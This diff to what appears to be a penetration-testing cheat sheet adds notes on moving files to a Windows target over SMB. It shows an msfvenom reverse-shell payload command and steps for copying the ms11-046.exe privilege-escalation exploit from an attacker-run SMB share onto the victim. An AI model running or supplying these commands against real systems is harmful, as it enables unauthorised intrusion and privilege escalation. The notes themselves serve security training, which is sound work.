@@ -1270,7 +1270,17 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 ## Windows File Transfers with SMB
 - https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
-- 
+```bash
+#on kali
+impacket-smbserver.py shareName sharePath
+
+#on windows
+##connect
+C:\>net use
+C:\>net use \\[host]\[share name]
+##copy
+C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
+```
 
 ## Pivoting for lateral movement
 - https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
